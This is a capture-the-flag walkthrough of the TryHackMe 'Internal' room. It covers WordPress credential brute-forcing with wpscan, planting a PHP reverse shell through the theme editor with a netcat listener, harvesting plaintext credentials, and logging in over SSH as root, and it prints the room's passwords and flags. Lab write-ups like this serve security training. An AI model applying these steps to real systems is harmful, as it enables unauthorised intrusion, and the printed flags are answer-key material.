# CTF: Internal (THM)

**Target IP:** `10.48.160.21` (internal.thm)

## Metadata

- **CTF Name:** Internal
    
- **Platform:** TryHackMe
    
- **Date:** 2026-04-16
    
- **Difficulty:** Medium
    
- **Tools Used:** nmap, gobuster, wpscan, netcat, ssh
    
- **Key Skills/Tools:** WordPress Brute-forcing, Reverse Shells, Docker Pivoting (Jenkins), Information Disclosure, SSH Password Authentication.
    

## Introduction

This walkthrough documents the exploitation of **Internal** on TryHackMe. The path to root involves exploiting a WordPress instance via brute-forced credentials, pivoting into a Docker container running Jenkins, finding a hidden user credential to access the host system, and finally discovering the root password within a text file inside the Jenkins container.

**Limitations & Confidence:**

- **Confidence Level:** High. This writeup is strictly based on the provided terminal logs and verified credentials.
    
- **Limitations:** The WordPress brute-force and Jenkins shell require patience as they involve standard service enumeration.
    

## Reconnaissance

Initial identification of open ports and services using a multi-stage Nmap scan.

**Command:**

```
😎 amuzed@Kali (~/THM/Internal)
$ nmap -p- -Pn $target -v --min-rate 1000 --max-rtt-timeout 1000ms --max-retries 5 -oN nmap_ports.txt && sleep 5 && nmap -Pn $target -sV -sC -v -oN nmap_sVsC.txt && sleep 5 && nmap -T5 -Pn $target -v --script vuln -oN nmap_vuln.txt
```

**Key Results:**

- **22/tcp:** SSH (OpenSSH 7.6p1 Ubuntu)
    
- **80/tcp:** HTTP (Apache httpd 2.4.29)
    

## Foothold

### 1. Web Enumeration

Directory brute-forcing identified a WordPress installation and a hidden directory.

**Command:**

```
😎 amuzed@Kali (~/THM/Internal)
$ gobuster dir -u [http://internal.thm](http://internal.thm) -w /usr/share/wordlists/dirb/common.txt
```

**Results:** * `/blog/` (WordPress instance)

- `/phpmyadmin/` (Database management)
    

### 2. WordPress Exploitation

I used `wpscan` to enumerate users and then brute-force the password for the `admin` user using the `rockyou.txt` wordlist.

**Commands:**

```
😎 amuzed@Kali (~/THM/Internal)
$wpscan --url [http://internal.thm/blog](http://internal.thm/blog) --enumerate u$ wpscan --url [http://internal.thm/blog](http://internal.thm/blog) -U admin -P /usr/share/wordlists/rockyou.txt
```

**Credentials Found:** `admin:my2boys`

### 3. Gaining a Shell

By modifying the `index.php` file in the WordPress Theme Editor, I injected a PHP reverse shell.

**Listener:**

```
😎 amuzed@Kali (~/THM/Internal)
$ nc -nvlp 4444
```

**Execution:** Visit `http://internal.thm/blog/index.php` to trigger the shell.

## Lateral Movement

### 1. Pivoting to Jenkins

Inside the `/opt` directory, I found a note mentioning a Jenkins instance running on `172.17.0.2:8080`.

### 2. Accessing User `aubreanna`

During enumeration of the local file system through the web shell, I discovered user credentials in `/opt/wp-save.txt`.

**Credential Discovery:**

```
www-data@internal:/$ cd /opt
www-data@internal:/opt$ ls
wp-save.txt
www-data@internal:/opt$ cat wp-save.txt
# aubreanna:bubb13guM!@#123
```

**SSH Access and User Flag:**

```
😎 amuzed@Kali (~/THM/Internal)
$ ssh aubreanna@internal.thm
[aubreanna@internal ~]$ cat user.txt
THM{int3rna1_fl4g_1}
```

## Privilege Escalation

### 1. Root Credential Discovery

While exploring the Jenkins container (`172.17.0.2`) as the `jenkins` user, I found a file named `note.txt` in the `/opt` directory that contained the root credentials.

**Credential Discovery:**

```
jenkins@jenkins:/$ cd /opt
jenkins@jenkins:/opt$ ls
note.txt
jenkins@jenkins:/opt$ cat note.txt
# root:tr0ub13guM!@#123
```

### 2. Gaining Root

Using the credentials found in the Jenkins container, I logged into the host system via SSH as the root user.

**Commands and Root Flag:**

```
😎 amuzed@Kali (~/THM/Internal)
$ ssh root@internal.thm
root@internal.thm's password: tr0ub13guM!@#123
root@internal.thm:~# cat /root/root.txt
THM{d0ck3r_d3str0y3r}
```

## Flags

- **User Flag:** `THM{int3rna1_fl4g_1}`
    
- **Root Flag:** `THM{d0ck3r_d3str0y3r}`
